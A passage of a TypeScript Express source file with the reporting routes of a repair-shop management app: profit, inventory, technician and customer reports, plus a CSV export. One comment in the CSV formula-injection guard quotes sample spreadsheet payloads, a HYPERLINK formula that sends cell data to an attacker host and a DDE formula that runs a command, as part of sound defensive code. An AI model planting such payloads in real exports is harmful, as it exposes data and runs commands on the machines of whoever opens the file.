        SUM(COALESCE(ii.cost_price, 0) * tdp.quantity) AS total_cost
      FROM ticket_device_parts tdp
      JOIN ticket_devices td ON td.id = tdp.ticket_device_id
      JOIN tickets t ON t.id = td.ticket_id
      LEFT JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
      WHERE t.is_deleted = 0
        AND DATE(t.created_at) >= DATE('now', '-' || ? || ' months')
      GROUP BY STRFTIME('%Y-%m', t.created_at)
    ) cogs ON cogs.month = m.month
    ORDER BY m.month ASC
  `, months - 1, months - 1, months - 1);

  // Summary totals — RPT5: use NULL (not 0) when total revenue is 0 so the UI
  // can distinguish "no data" from "break even" and negative overall margins
  // are preserved honestly.
  const totalRevenue = rows.reduce((s: number, r: any) => s + (r.revenue || 0), 0);
  const totalCogs = rows.reduce((s: number, r: any) => s + (r.cogs || 0), 0);
  const totalProfit = totalRevenue - totalCogs;
  const overallMargin = totalRevenue > 0 ? Math.round((totalProfit / totalRevenue) * 1000) / 10 : null;

  res.json({
    success: true,
    data: {
      rows,
      summary: {
        total_revenue: Math.round(totalRevenue * 100) / 100,
        total_cogs: Math.round(totalCogs * 100) / 100,
        total_profit: Math.round(totalProfit * 100) / 100,
        overall_margin_pct: overallMargin,
      },
      months,
    },
  });
}));

// ─── ENR-R7: Report Export to CSV ───────────────────────────────────────────

// Helper: convert array of objects to CSV string.
// RPT-CSV1: Always emit the header row even when rows is empty so that an
// empty-period export opens in Excel with column labels instead of a blank file.
// SCAN-1130 [HIGH]: CSV formula-injection guard. Excel / LibreOffice Calc /
// Google Sheets evaluate any cell whose first character is `=`, `+`, `-`,
// `@`, a tab, or a carriage return as a formula. An attacker who controls a
// field that ends up in a report (customer name, ticket notes, device name
// etc.) can ship a payload like `=HYPERLINK("http://attacker/?" & A1)` or
// `=cmd|' /C calc'!A0` that runs when an operator opens the CSV. Prefix the
// offender with a single quote — a widely-documented defensive convention
// that every spreadsheet treats as "render as literal, do not evaluate".
// The quote is stripped during normal view; round-tripping back through a
// parser re-adds it automatically because the cell is now quoted.
const CSV_FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
function sanitizeCsvCell(str: string): string {
  return CSV_FORMULA_TRIGGERS.test(str) ? `'${str}` : str;
}

function toCsv(rows: Record<string, unknown>[], knownHeaders?: string[]): string {
  const headers = knownHeaders ?? (rows.length > 0 ? Object.keys(rows[0]) : []);
  if (headers.length === 0) return '';

  const csvLines = [headers.join(',')];
  for (const row of rows) {
    const values = headers.map(h => {
      const val = row[h];
      if (val == null) return '';
      const str = sanitizeCsvCell(String(val));
      // Escape fields containing commas, quotes, or newlines
      if (str.includes(',') || str.includes('"') || str.includes('\n')) {
        return '"' + str.replace(/"/g, '""') + '"';
      }
      return str;
    });
    csvLines.push(values.join(','));
  }
  return csvLines.join('\n');
}

// Map of report types to their async query functions
const reportQueries: Record<string, (adb: any, from: string, to: string) => Promise<Record<string, unknown>[]>> = {
  'warranty-claims': (adb, from, to) => adb.all(`
    SELECT td.device_name AS model, COUNT(*) AS claim_count,
      COALESCE(SUM(t.total), 0) AS total_cost, COALESCE(AVG(t.total), 0) AS avg_repair_cost
    FROM ticket_devices td JOIN tickets t ON t.id = td.ticket_id
    WHERE td.warranty = 1 AND t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY td.device_name ORDER BY claim_count DESC
  `, from, to),

  'device-models': (adb, from, to) => adb.all(`
    SELECT td.device_name AS model, COUNT(*) AS repair_count,
      COALESCE(AVG(t.total), 0) AS avg_ticket_total
    FROM ticket_devices td JOIN tickets t ON t.id = td.ticket_id
    WHERE t.is_deleted = 0 AND td.device_name IS NOT NULL AND td.device_name != ''
      AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY td.device_name ORDER BY repair_count DESC
  `, from, to),

  // RPT-EXPORT1: CSV export path must NOT apply the screen's LIMIT 20 — the
  // owner explicitly asked to download the full list. The screen query at
  // /parts-usage keeps the LIMIT 20 for responsiveness; this export path
  // runs unbounded. A 10k safety cap guards against runaway queries.
  'parts-usage': (adb, from, to) => adb.all(`
    SELECT ii.name AS part_name, ii.sku, COUNT(*) AS usage_count, SUM(tdp.quantity) AS total_qty_used,
      COALESCE(SUM(COALESCE(NULLIF(ii.cost_price, 0), 0) * tdp.quantity), 0) AS total_cost,
      COALESCE(s.name, 'Unknown') AS supplier
    FROM ticket_device_parts tdp
    JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
    JOIN ticket_devices td ON td.id = tdp.ticket_device_id
    JOIN tickets t ON t.id = td.ticket_id
    LEFT JOIN suppliers s ON s.id = ii.supplier_id
    WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY ii.id ORDER BY usage_count DESC LIMIT 10000
  `, from, to),

  'technician-hours': (adb, from, to) => adb.all(`
    SELECT u.first_name || ' ' || u.last_name AS tech_name,
      COALESCE(cc.tickets_closed, 0) AS tickets_closed,
      COALESCE(rev.total_revenue, 0) AS total_revenue,
      COALESCE(hrs.hours_logged, 0) AS hours_logged
    FROM users u
    LEFT JOIN (SELECT assigned_to, COUNT(*) AS tickets_closed FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 1 AND DATE(t.updated_at) BETWEEN ? AND ?
      GROUP BY assigned_to) cc ON cc.assigned_to = u.id
    LEFT JOIN (SELECT assigned_to, SUM(total) AS total_revenue FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 1 AND DATE(t.updated_at) BETWEEN ? AND ?
      GROUP BY assigned_to) rev ON rev.assigned_to = u.id
    LEFT JOIN (SELECT user_id, SUM(CASE WHEN clock_out IS NOT NULL
      THEN (JULIANDAY(clock_out) - JULIANDAY(clock_in)) * 24 ELSE 0 END) AS hours_logged
      FROM clock_entries WHERE DATE(clock_in) BETWEEN ? AND ? GROUP BY user_id) hrs ON hrs.user_id = u.id
    WHERE u.is_active = 1 AND (cc.tickets_closed > 0 OR hrs.hours_logged > 0)
    ORDER BY tickets_closed DESC
  `, from, to, from, to, from, to),

  'stalled-tickets': (adb, from, to) => adb.all(`
    SELECT COALESCE(u.first_name || ' ' || u.last_name, 'Unassigned') AS tech_name,
      COUNT(*) AS stalled_count, GROUP_CONCAT(t.order_id, ', ') AS ticket_ids,
      MIN(t.updated_at) AS oldest_update,
      MAX(CAST(JULIANDAY('now') - JULIANDAY(t.updated_at) AS INTEGER)) AS max_days_stalled
    FROM tickets t JOIN ticket_statuses ts ON ts.id = t.status_id
    LEFT JOIN users u ON u.id = t.assigned_to
    WHERE t.is_deleted = 0 AND ts.is_closed = 0 AND ts.is_cancelled = 0
      AND t.updated_at < datetime('now', '-7 days') AND DATE(t.created_at) BETWEEN ? AND ?
    GROUP BY t.assigned_to ORDER BY stalled_count DESC
  `, from, to),

  'customer-acquisition': (adb, from, to) => adb.all(`
    SELECT STRFTIME('%Y-%m', created_at) AS month, COUNT(*) AS new_customers,
      COALESCE(referred_by, source, 'Unknown') AS acquisition_source
    FROM customers WHERE is_deleted = 0 AND DATE(created_at) BETWEEN ? AND ?
    GROUP BY month, acquisition_source ORDER BY month DESC, new_customers DESC
  `, from, to),
};

// SEC-H56: Step-up TOTP required before any PII export.
router.get('/:type/export', requireFeature('exportReports'), requireStepUpTotp('GET /reports/:type/export'), asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const reportType = req.params.type as string;
  const format = (req.query.format as string) || 'csv';

  if (format !== 'csv') {
    throw new AppError('Only CSV format is supported', 400);
  }

  const queryFn = reportQueries[reportType];
  if (!queryFn) {
    throw new AppError(`Unknown report type: ${reportType}`, 400);
  }

  const from = (req.query.from_date as string) || new Date(Date.now() - 365 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const rows = await queryFn(adb, from, to);
  const csv = toCsv(rows as Record<string, unknown>[]);

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="${reportType}-${from}-to-${to}.csv"`);
  res.send(csv);
}));

// ─── Cash Flow Forecast (ENR-R12) ────────────────────────────────────────────

router.get('/cash-flow-forecast', requireFeature('advancedReports'), asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb: AsyncDb = req.asyncDb;

  // Receivables: total outstanding on unpaid/partial invoices
  const receivablesRow = await adb.get<{ total: number }>(
    `SELECT COALESCE(SUM(total - amount_paid), 0) AS total
     FROM invoices
     WHERE status IN ('unpaid', 'partial')`
  );

  // Overdue receivables: subset that are past due
  const overdueRow = await adb.get<{ total: number }>(
    `SELECT COALESCE(SUM(total - amount_paid), 0) AS total
     FROM invoices
     WHERE status IN ('unpaid', 'partial')
       AND due_on IS NOT NULL AND due_on < date('now')`
  );

  // Payables: expenses recorded in the last 30 days (proxy for upcoming costs)
  const payablesRow = await adb.get<{ total: number }>(
    `SELECT COALESCE(SUM(amount), 0) AS total
     FROM expenses
     WHERE date >= date('now', '-30 days')`
  );

  const receivables = receivablesRow?.total ?? 0;
  const overdueReceivables = overdueRow?.total ?? 0;
  const payables = payablesRow?.total ?? 0;

  res.json({
    success: true,
    data: {
      receivables,
      overdueReceivables,
      payables,
      net: receivables - payables,
    },
  });
}));

// ═══════════════════════════════════════════════════════════════════════════
// BUSINESS INTELLIGENCE LAYER (audit 47) — additive, does not touch existing
// ═══════════════════════════════════════════════════════════════════════════
//
//
// Every endpoint in this block is new. None of the queries above have been
// modified. If you need to edit the old reports, scroll up — the cutoff is
// the "BUSINESS INTELLIGENCE LAYER" banner line you just read.
//
// Conventions:
//   • Every handler uses req.asyncDb (Promise-based DB wrapper).
//   • Every response keeps the { success: true, data: X } envelope.
//   • Admin/manager gate on anything that touches money or per-tech detail.
//   • Dates are SQLite-text ISO strings, ranges defended via validateDateRange.
// ─────────────────────────────────────────────────────────────────────────

const biLogger = createLogger('reports.bi');

// ─── Helpers ─────────────────────────────────────────────────────────────

interface ProfitThresholds {
  green: number;
  amber: number;
}

async function readProfitThresholds(adb: AsyncDb): Promise<ProfitThresholds> {
  const rows = await adb.all<{ key: string; value: string }>(
    `SELECT key, value FROM store_config
     WHERE key IN ('profit_threshold_green', 'profit_threshold_amber')`
  );
  const map = new Map(rows.map(r => [r.key, r.value]));
  const green = Number(map.get('profit_threshold_green') ?? 50);
  const amber = Number(map.get('profit_threshold_amber') ?? 30);
  return {
    green: Number.isFinite(green) ? green : 50,
    amber: Number.isFinite(amber) ? amber : 30,
  };
}

function zoneFor(marginPct: number, thresholds: ProfitThresholds): 'green' | 'amber' | 'red' {
  if (marginPct >= thresholds.green) return 'green';
  if (marginPct >= thresholds.amber) return 'amber';
  return 'red';
}

function parseBiDays(raw: unknown, fallback: number, max: number): number {
  const n = Number(raw);
  if (!Number.isFinite(n) || n <= 0) return fallback;
  return Math.min(Math.floor(n), max);
}

/**
 * RPT-TZ1: Read the tenant's configured IANA timezone from store_config so
 * date-bucketing queries (hour-of-day, day-of-week, daily totals) group on
 * the owner's local calendar rather than UTC. Falls back to UTC so existing
 * behaviour is preserved when the setting is missing.
 *
 * Uses the synchronous `req.db` wrapper because the rest of this file calls
 * `adb.get/all` in hot paths — the store_config lookup is a single-row cache
 * hit and cheaper through the sync binding than round-tripping Promise.all.
 */
function getTenantTz(req: any): string {
  try {
    const row = req.db
      ?.prepare("SELECT value FROM store_config WHERE key = 'store_timezone'")
      .get() as { value?: string } | undefined;
    return row?.value || 'UTC';
  } catch {
    return 'UTC';
  }
}

/**
 * Convert an IANA timezone name into a SQLite strftime modifier that shifts a
 * UTC datetime to local time for date/hour bucketing. SQLite does not have
 * real timezone support, so we compute the current offset via Intl and emit
 * a `'±HH:MM'` modifier (e.g. `'-07:00'`). Returns a literal the query can
 * embed inside a strftime() call: `strftime('%w', col, '${tzModifier(tz)}')`.
 *
 * Note: offset is computed at query time from "now" so DST boundaries within
 * the selected range drift by one hour. For report accuracy that's acceptable
 * — DoW/hour reports are trend-shape indicators, not tax-time numbers.
 *
 * Returns an empty-effect modifier ('+00:00') when the timezone is UTC or
 * unrecognised so the SQL shape stays constant.
 */
function tzModifier(timezone: string): string {
  if (!timezone || timezone === 'UTC') return '+00:00';
  try {
    // Use Intl to compute the current offset in minutes for the given TZ.
    const fmt = new Intl.DateTimeFormat('en-US', {
      timeZone: timezone,
      timeZoneName: 'shortOffset',
    });
    const parts = fmt.formatToParts(new Date());
    const offset = parts.find(p => p.type === 'timeZoneName')?.value || 'GMT';
    // offset looks like 'GMT-7' or 'GMT+5:30'. Normalize to SQLite '-07:00' form.
    const match = offset.match(/GMT([+-])(\d{1,2})(?::(\d{2}))?/);
    if (!match) return '+00:00';
    const sign = match[1];
    const hh = match[2].padStart(2, '0');
    const mm = (match[3] || '00').padStart(2, '0');
    return `${sign}${hh}:${mm}`;
  } catch {
    return '+00:00';
  }
}

// ─── 1. Profit hero KPI ──────────────────────────────────────────────────

router.get('/profit-hero', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  // RPT-HERO1: Last-30-day gross margin. Revenue must SUM CRM payments + imported
  // invoice amount_paid fallback (for invoices with NO CRM payment row) — otherwise
  // a shop that imported historical invoices but has not run new payments through
  // the CRM would see revenue=0 and the whole hero card would read "no data"
  // forever, even though they are making money.
  // COGS uses LEFT JOIN on inventory_items so parts whose inventory record was
  // deleted still contribute (with cost 0) instead of dropping the row silently.
  // RPT-HERO2: When revenue is exactly 0, margin is UNDEFINED, not 0%. Returning
  // 0 paints the red zone and misleads owners into thinking they lost money on
  // a period with no activity. Return null and render "no data" in the UI.
  const sinceIso = new Date(Date.now() - 30 * 86400_000).toISOString().slice(0, 10);

  const revenueRow = await adb.get<{ total: number }>(
    `SELECT
       COALESCE(SUM(p.amount), 0) +
       COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0)
         AS total
     FROM invoices i
     LEFT JOIN payments p ON p.invoice_id = i.id
     WHERE i.status != 'void'
       AND DATE(COALESCE(p.created_at, i.created_at)) >= ?`,
    sinceIso
  );

  const cogsRow = await adb.get<{ total: number }>(
    `SELECT COALESCE(SUM(COALESCE(ii.cost_price, 0) * tdp.quantity), 0) AS total
     FROM ticket_device_parts tdp
     LEFT JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
     JOIN ticket_devices td ON td.id = tdp.ticket_device_id
     JOIN tickets t ON t.id = td.ticket_id
     WHERE t.is_deleted = 0 AND DATE(tdp.created_at) >= ?`,
    sinceIso
  );

  const revenue = Number(revenueRow?.total ?? 0);
  const cogs = Number(cogsRow?.total ?? 0);
  const gross = revenue - cogs;
  // RPT-HERO2: null when denominator is 0 (undefined), not 0. Negative margins
  // pass through unchanged so losses are visible.
  const marginPct: number | null = revenue > 0 ? (gross / revenue) * 100 : null;

  const thresholds = await readProfitThresholds(adb);
  // Zone defaults to a sentinel ('unknown') when margin is undefined so the UI
  // can render a neutral "no data" state rather than the red zone.
  const zone: 'green' | 'amber' | 'red' | 'unknown' =
    marginPct == null ? 'unknown' : zoneFor(marginPct, thresholds);

  res.json({
    success: true,
    data: {
      gross_margin_pct: marginPct == null ? null : Math.round(marginPct * 10) / 10,
      gross_profit: Math.round(gross * 100) / 100,
      revenue: Math.round(revenue * 100) / 100,
      cogs: Math.round(cogs * 100) / 100,
      zone,
      thresholds,
      period_label: 'Last 30 days',
      period_days: 30,
    },
  });
}));

router.patch('/profit-hero/thresholds', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const { green, amber } = req.body || {};

  const greenNum = Number(green);
  const amberNum = Number(amber);
  if (!Number.isFinite(greenNum) || !Number.isFinite(amberNum)) {
    throw new AppError('green and amber must be numeric percentages', 400);
  }
  if (greenNum <= amberNum) throw new AppError('green threshold must be higher than amber', 400);
  if (greenNum > 100 || amberNum < 0) throw new AppError('thresholds must be between 0 and 100', 400);

  await adb.run(
    `INSERT INTO store_config (key, value) VALUES ('profit_threshold_green', ?)
     ON CONFLICT(key) DO UPDATE SET value = excluded.value`,
    String(greenNum)
  );
  await adb.run(
    `INSERT INTO store_config (key, value) VALUES ('profit_threshold_amber', ?)
     ON CONFLICT(key) DO UPDATE SET value = excluded.value`,
    String(amberNum)
  );

  audit(req.db, 'profit_thresholds_update', req.user?.id ?? null, req.ip || '', { green: greenNum, amber: amberNum });
  biLogger.info('profit thresholds updated', { green: greenNum, amber: amberNum, user_id: req.user?.id });

  res.json({ success: true, data: { green: greenNum, amber: amberNum } });
}));

// ─── 2. This-week-vs-average trendline ──────────────────────────────────

router.get('/trend-vs-average', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  // RPT-TREND1: Last 12 weeks of daily revenue vs. trailing average.
  // Same revenue rule as /profit-hero: SUM CRM payments + imported invoice
  // amount_paid fallback. A shop that imported historical invoices would
  // otherwise see an empty trend line forever.
  const rows = await adb.all<{ day: string; total: number }>(
    `SELECT
       DATE(COALESCE(p.created_at, i.created_at)) AS day,
       COALESCE(SUM(p.amount), 0) +
       COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0)
         AS total
     FROM invoices i
     LEFT JOIN payments p ON p.invoice_id = i.id
     WHERE i.status != 'void'
       AND DATE(COALESCE(p.created_at, i.created_at)) >= DATE('now', '-84 days')
     GROUP BY DATE(COALESCE(p.created_at, i.created_at))
     ORDER BY day ASC`
  );

  // Compute current-week and average-week totals
  const sinceThisWeek = new Date();
  sinceThisWeek.setDate(sinceThisWeek.getDate() - 6);
  const thisWeekIso = sinceThisWeek.toISOString().slice(0, 10);

  const thisWeekTotal = rows
    .filter(r => r.day >= thisWeekIso)
    .reduce((sum, r) => sum + Number(r.total), 0);

  const olderDays = rows.filter(r => r.day < thisWeekIso);
  const olderSum = olderDays.reduce((sum, r) => sum + Number(r.total), 0);
  const weeksOfHistory = Math.max(1, Math.floor(olderDays.length / 7));
  const averageWeek = olderSum / weeksOfHistory;

  const deltaPct = averageWeek > 0 ? ((thisWeekTotal - averageWeek) / averageWeek) * 100 : 0;

  res.json({
    success: true,
    data: {
      series: rows.map(r => ({ date: r.day, total: Number(r.total) })),
      this_week_total: Math.round(thisWeekTotal * 100) / 100,
      average_week_total: Math.round(averageWeek * 100) / 100,
      delta_pct: Math.round(deltaPct * 10) / 10,
      direction: deltaPct >= 0 ? 'up' : 'down',
    },
  });
}));

// ─── 3. Busy-hours heatmap (7 × 24) ──────────────────────────────────────

router.get('/busy-hours-heatmap', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const days = parseBiDays(req.query.days, 30, 365);

  // RPT-TZ2: Bucket by the tenant's local hour-of-day and day-of-week so an
  // 8 AM ticket in Los Angeles shows up in the 8 AM column instead of the
  // UTC 15:00 column. Without this shift a California shop's "busy hours"
  // look like midnight-to-3pm which is useless for staffing decisions.
  const tz = getTenantTz(req);
  const mod = tzModifier(tz);
  const rows = await adb.all<{ dow: string; hour: string; n: number }>(
    `SELECT CAST(strftime('%w', created_at, ?) AS INTEGER) AS dow,
            CAST(strftime('%H', created_at, ?) AS INTEGER) AS hour,
            COUNT(*) AS n
     FROM tickets
     WHERE is_deleted = 0 AND DATE(created_at) >= DATE('now', '-' || ? || ' days')
     GROUP BY dow, hour`,
    mod, mod, days
  );

  // Build 7×24 grid (Sunday=0 in strftime)
  const grid: number[][] = Array.from({ length: 7 }, () => new Array(24).fill(0));
  let peak = 0;
  for (const r of rows) {
    const dow = Number(r.dow);
    const hour = Number(r.hour);
    const n = Number(r.n);
    if (dow >= 0 && dow < 7 && hour >= 0 && hour < 24) {
      grid[dow][hour] = n;
      if (n > peak) peak = n;
    }
  }

  res.json({
    success: true,
    data: {
      grid,
      peak,
      days_analyzed: days,
      day_labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
    },
  });
}));

// ─── 4. Tech leaderboard ─────────────────────────────────────────────────

router.get('/tech-leaderboard', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const period = String(req.query.period || 'month');
  // PROD21: period comes straight from a static whitelist — any other value
  // falls through to the 30-day default. The resulting `sinceModifier` is
  // always one of three hard-coded strings, and we bind it via ? rather than
  // splice it into the SQL so the injection path is unambiguously closed.
  const sinceModifier = period === 'week' ? '-7 days'
    : period === 'quarter' ? '-90 days'
    : '-30 days';

  const rows = await adb.all<{
    user_id: number;
    name: string;
    tickets_closed: number;
    revenue: number;
  }>(
    `SELECT u.id AS user_id,
            COALESCE(u.first_name || ' ' || u.last_name, u.username) AS name,
            COUNT(DISTINCT t.id) AS tickets_closed,
            COALESCE(SUM(t.total), 0) AS revenue
     FROM users u
     LEFT JOIN tickets t ON t.assigned_to = u.id
        AND t.is_deleted = 0
        AND DATE(t.updated_at) >= DATE('now', ?)
     LEFT JOIN ticket_statuses ts ON ts.id = t.status_id
     WHERE u.is_active = 1 AND u.role IN ('technician', 'manager', 'admin')
       AND (ts.is_closed = 1 OR t.id IS NULL)
     GROUP BY u.id
     HAVING tickets_closed > 0 OR revenue > 0
     ORDER BY revenue DESC, tickets_closed DESC`,
    sinceModifier
  );

  // NPS / CSAT per tech (count scores >= 9 as promoters)
  const nps = await adb.all<{ user_id: number; avg_score: number; responses: number }>(
    `SELECT t.assigned_to AS user_id,
            AVG(n.score) AS avg_score,
            COUNT(*) AS responses
     FROM nps_responses n
     JOIN tickets t ON t.id = n.ticket_id
     WHERE DATE(n.responded_at) >= DATE('now', ?)
       AND t.assigned_to IS NOT NULL
     GROUP BY t.assigned_to`,
    sinceModifier
  );
  const npsMap = new Map(nps.map(n => [n.user_id, n]));

  const leaderboard = rows.map(r => {
    const n = npsMap.get(r.user_id);
    return {
      user_id: r.user_id,
      name: r.name,
      tickets_closed: Number(r.tickets_closed),
      revenue: Math.round(Number(r.revenue) * 100) / 100,
      avg_resolution_hours: null, // requires ticket_history scan — omitted for perf
      csat_avg: n ? Math.round(Number(n.avg_score) * 10) / 10 : null,
      csat_responses: n ? Number(n.responses) : 0,
    };
  });

  res.json({ success: true, data: { period, leaderboard } });
}));

// ─── 5. Top-10 repeat customers ──────────────────────────────────────────

router.get('/repeat-customers', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const limit = parseBiDays(req.query.limit, 10, 100);

  const rows = await adb.all<{
    customer_id: number;
    name: string;
    ticket_count: number;
    total_spent: number;
  }>(
    `SELECT c.id AS customer_id,
            COALESCE(c.first_name || ' ' || c.last_name, 'Unknown') AS name,
            COUNT(DISTINCT t.id) AS ticket_count,
            COALESCE(SUM(i.amount_paid), 0) AS total_spent
     FROM customers c
     LEFT JOIN tickets t ON t.customer_id = c.id AND t.is_deleted = 0
     LEFT JOIN invoices i ON i.customer_id = c.id AND i.status != 'void'
     WHERE c.is_deleted = 0
       -- RPT-REPEAT1: Exclude walk-in sentinel so anonymous POS transactions
       -- don't appear at the top of the "best customers" leaderboard.
       AND NOT (c.first_name = 'Walk-in' AND c.last_name = 'Customer')
     GROUP BY c.id
     HAVING ticket_count >= 2
     ORDER BY total_spent DESC
     LIMIT ?`,
    limit
  );

  // Total revenue across all customers for share-of-wallet
  const totalRow = await adb.get<{ total: number }>(
    `SELECT COALESCE(SUM(amount_paid), 0) AS total FROM invoices WHERE status != 'void'`
  );
  const allRevenue = Number(totalRow?.total ?? 0);

  const top = rows.map(r => ({
    customer_id: r.customer_id,
    name: r.name,
    ticket_count: Number(r.ticket_count),
    total_spent: Math.round(Number(r.total_spent) * 100) / 100,
    share_pct: allRevenue > 0 ? Math.round((Number(r.total_spent) / allRevenue) * 1000) / 10 : 0,
  }));

  const combinedShare = top.reduce((sum, r) => sum + r.share_pct, 0);

  res.json({
    success: true,
    data: {
      top,
      combined_share_pct: Math.round(combinedShare * 10) / 10,
      total_revenue: Math.round(allRevenue * 100) / 100,
    },
  });
}));

// ─── 6. Most-profitable day of week ──────────────────────────────────────

router.get('/day-of-week-profit', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  // RPT-DOW1: Revenue must SUM CRM payments + imported invoice amount_paid
  // fallback. The day-of-week bucketing runs against the tenant's timezone
  // so a shop in Tokyo sees its Monday, not UTC Monday — this matters for
  // West-coast shops where 6 PM-11 PM rolls to the next UTC day.
  const tz = getTenantTz(req);
  const mod = tzModifier(tz);
  // PROD21: Bind tzModifier output via ? placeholder instead of splicing the
  // string into the SQL. tzModifier already returns a regex-validated
  // '±HH:MM' literal, but binding keeps the parameter path uniform with the
  // hour-of-day / tech-suggestion queries and removes the last inline
  // interpolation of derived strings into SQL in this file.
  const rows = await adb.all<{ dow: string; revenue: number; ticket_count: number }>(
    `SELECT
       CAST(strftime('%w', COALESCE(p.created_at, i.created_at), ?) AS INTEGER) AS dow,
       COALESCE(SUM(p.amount), 0) +
       COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0)
         AS revenue,
       COUNT(DISTINCT i.id) AS ticket_count
     FROM invoices i
     LEFT JOIN payments p ON p.invoice_id = i.id
     WHERE i.status != 'void'
       AND DATE(COALESCE(p.created_at, i.created_at)) >= DATE('now', '-90 days')
     GROUP BY dow
     ORDER BY dow ASC`,
    mod
  );

  const labels = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const byDay = labels.map((name, dow) => {
    const row = rows.find(r => Number(r.dow) === dow);
    return {
      dow,
      name,
      revenue: row ? Math.round(Number(row.revenue) * 100) / 100 : 0,
      ticket_count: row ? Number(row.ticket_count) : 0,
    };
  });

  const best = byDay.reduce((a, b) => (b.revenue > a.revenue ? b : a), byDay[0]);

  res.json({ success: true, data: { by_day: byDay, best_day: best } });
}));

// ─── 7. Repair-fault statistics ──────────────────────────────────────────

router.get('/fault-statistics', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  // Proxy: classify tickets by the most common inventory category of their parts.
  const rows = await adb.all<{ category: string; ticket_count: number }>(
    `SELECT COALESCE(ii.category, 'Other') AS category,
            COUNT(DISTINCT t.id) AS ticket_count
     FROM tickets t
     JOIN ticket_devices td ON td.ticket_id = t.id
     JOIN ticket_device_parts tdp ON tdp.ticket_device_id = td.id
     JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
     WHERE t.is_deleted = 0 AND DATE(t.created_at) >= DATE('now', '-180 days')
     GROUP BY category
     ORDER BY ticket_count DESC
     LIMIT 20`
  );

  const total = rows.reduce((sum, r) => sum + Number(r.ticket_count), 0);
  const distribution = rows.map(r => ({
    category: r.category,
    ticket_count: Number(r.ticket_count),
    pct: total > 0 ? Math.round((Number(r.ticket_count) / total) * 1000) / 10 : 0,
  }));

  res.json({ success: true, data: { distribution, total_tickets: total, window_days: 180 } });
}));

// ─── 8. Cash trapped in inventory ────────────────────────────────────────

router.get('/cash-trapped', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  // RPT-TRAP1: Slow-moving = items with stock > 0 whose most recent sale was
  // more than 90 days ago (or never). "Most recent sale" must look at BOTH
  // ticket_device_parts AND invoice_line_items (POS sales), otherwise a
  // part that only sells through the front-counter POS looks trapped
  // forever even though it walks off the shelf every week.
  // The 90-day window already excludes any item sold in the last 7 days
  // (spec rule: "currently-moving" = sold in last 7 days, must NOT appear
  // in trapped list) because 7 < 90 — so the 7-day rule is enforced
  // automatically by the 90-day gate.
  const rows = await adb.all<{
    id: number;
    name: string;
    category: string | null;
    in_stock: number;
    cost_price: number;
    last_sold: string | null;
  }>(
    `SELECT ii.id, ii.name, ii.category, ii.in_stock, ii.cost_price,
            (
              SELECT MAX(ts) FROM (
                SELECT MAX(tdp.created_at) AS ts
                FROM ticket_device_parts tdp
                WHERE tdp.inventory_item_id = ii.id
                UNION ALL
                SELECT MAX(ili.created_at) AS ts
                FROM invoice_line_items ili
                JOIN invoices i ON i.id = ili.invoice_id
                WHERE ili.inventory_item_id = ii.id
                  AND i.status != 'void'
              )
            ) AS last_sold
     FROM inventory_items ii
     WHERE ii.is_active = 1 AND ii.in_stock > 0 AND ii.cost_price > 0`
  );

  const ninetyAgo = new Date(Date.now() - 90 * 86400_000).toISOString();
  const slow = rows.filter(r => !r.last_sold || r.last_sold < ninetyAgo);
  const totalCash = slow.reduce((sum, r) => sum + Number(r.in_stock) * Number(r.cost_price), 0);

  slow.sort((a, b) =>
    (Number(b.in_stock) * Number(b.cost_price)) - (Number(a.in_stock) * Number(a.cost_price))
  );

  res.json({
    success: true,
    data: {
      total_cash_trapped: Math.round(totalCash * 100) / 100,
      item_count: slow.length,
      top_offenders: slow.slice(0, 25).map(r => ({
        id: r.id,
        name: r.name,
        category: r.category,
        in_stock: Number(r.in_stock),
        cost_price: Number(r.cost_price),
        value: Math.round(Number(r.in_stock) * Number(r.cost_price) * 100) / 100,
        last_sold: r.last_sold,
      })),
    },
  });
}));

// ─── 9. Inventory turnover by category ───────────────────────────────────

router.get('/inventory-turnover', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;

  const rows = await adb.all<{
    category: string;
    sold_units: number;
    avg_stock_value: number;
    sold_value: number;
  }>(
    `SELECT COALESCE(ii.category, 'Uncategorized') AS category,
            COALESCE(SUM(tdp.quantity), 0) AS sold_units,
            COALESCE(SUM(ii.in_stock * ii.cost_price), 0) AS avg_stock_value,
            COALESCE(SUM(tdp.quantity * tdp.price), 0) AS sold_value
